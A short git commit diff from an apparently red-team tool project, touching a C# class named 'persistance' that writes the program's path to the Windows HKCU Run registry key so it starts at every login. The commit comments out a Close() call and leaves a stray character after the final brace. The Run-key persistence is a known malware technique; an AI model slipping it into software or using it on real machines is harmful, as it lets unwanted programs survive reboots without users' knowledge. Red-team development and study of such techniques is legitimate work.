d1b53323f0e1c8dad7439d6cc399e64e5b71cc28
Pratiman Joshi <pratiman9jhin@outlook.com>
2022-02-16 22:10:28 +0530

    final commit for day

--- persistance.cs
+++ persistance.cs
@@ -7,10 +7,10 @@ namespace red {
             Microsoft.Win32.RegistryKey rkInstance = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run",true);
             rkInstance.SetValue("RedTeamDevelop", newInstance.executablePath);
             rkInstance.Dispose();
-            rkInstance.Close();
+            //rkInstance.Close();
         }
         public persistance(GeneralInfo instance) {
             newInstance = instance;
         }
     }
-}
+}s
